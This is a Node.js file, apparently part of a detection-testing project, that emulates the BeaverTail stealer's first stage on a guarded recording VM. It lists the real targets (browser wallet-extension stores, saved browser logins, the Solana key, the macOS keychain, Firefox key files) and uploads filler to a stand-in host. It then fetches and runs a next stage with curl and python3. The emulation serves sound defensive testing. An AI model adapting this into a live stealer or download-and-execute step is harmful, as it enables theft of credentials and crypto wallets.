// The first stage (the write-ups' BeaverTail), re-implemented from the public
// analyses (../../../README.md) so that a sensor on the machine sees what it
// saw of the real one: the same files opened by node, the same upload, the
// same download of the next stage with curl, python3 started on it. What a
// sensor cannot see is not done: every file is read and its content dropped,
// and the upload is filler of the same length.
//
// In the campaign this is one long line at the end of a backend file, its
// strings hidden. Here it is a file of its own, plain, which app.js loads.
//
// It runs only on a recording VM, and stops at once anywhere else.
const { exec } = require("node:child_process");
const dns = require("node:dns/promises");
const fs = require("node:fs");
const http = require("node:http");
const os = require("node:os");
const path = require("node:path");

const HOST = "cdn.shop-metrics.example";
const PORT = 1224;
const ID = "7";
const HOME = os.homedir();
const SUPPORT = path.join(HOME, "Library/Application Support");
const NEXT = path.join(HOME, ".nvc");

// A recording VM says it is one (vm/provision.sh writes the file), and the
// server's name there is the stand-in on the host, a private address. Both,
// or nothing below runs.
async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) return false;
  const { address } = await dns.lookup(HOST, 4);
  return /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address);
}

// A file is opened and read as the real one reads it; only its length is kept.
const size = (file) => {
  try {
    return fs.readFileSync(file).length;
  } catch {
    return 0;
  }
};
const list = (dir) => {
  try {
    return fs.readdirSync(dir);
  } catch {
    return [];
  }
};

// 1. Wallet extensions' stores in each profile of each browser (the ids are
//    the extensions' public ones: MetaMask, Phantom, Coinbase Wallet, Rabby),
//    the Solana key file, the login keychain, the browsers' saved logins, and
//    Firefox's key and login files.
function collect() {
  const browsers = ["Google/Chrome", "BraveSoftware/Brave-Browser", "com.operasoftware.Opera"];
  const wallets = ["nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "hnfanknocfeofbddgcijnmhnfnkdnaad", "acmacodkjbdgmoleebolmdjonilkdbch"];
  let total = 0;
  for (const browser of browsers) {
    const root = path.join(SUPPORT, browser);
    for (const profile of list(root).filter((d) => d === "Default" || d.startsWith("Profile "))) {
      for (const id of wallets) {
        const store = path.join(root, profile, "Local Extension Settings", id);
        for (const f of list(store).filter((f) => /\.(log|ldb)$/.test(f))) total += size(path.join(store, f));
      }
      total += size(path.join(root, profile, "Login Data"));
    }
  }
  total += size(path.join(HOME, ".config/solana/id.json"));
  total += size(path.join(HOME, "Library/Keychains/login.keychain-db"));
  const firefox = path.join(SUPPORT, "Firefox/Profiles");
  for (const profile of list(firefox)) {
    for (const f of ["key4.db", "logins.json"]) total += size(path.join(firefox, profile, f));
  }
  return total;
}

// 2. Where the real one uploads what it collected, this sends as many bytes
//    of filler to the same path.
function upload(bytes) {
  return new Promise((done) => {
    const req = http.request({ host: HOST, port: PORT, path: "/uploads", method: "POST",
      headers: { "content-type": "application/octet-stream", "content-length": bytes } }, (res) => res.resume().on("end", done));
    req.on("error", done);
    req.end(Buffer.alloc(bytes, "x"));
  });
}

// 3. The next stage, a Python script, fetched with curl into a hidden file in
//    the home directory and started with python3.
function next() {
  exec(`curl -Lo "${NEXT}" "http://${HOST}:${PORT}/client/${ID}"`, (err) => {
    if (!err) exec(`python3 "${NEXT}"`);
  });
}

(async () => {
  if (!(await guard())) return;
  await upload(collect());
  next();
})().catch(() => {});
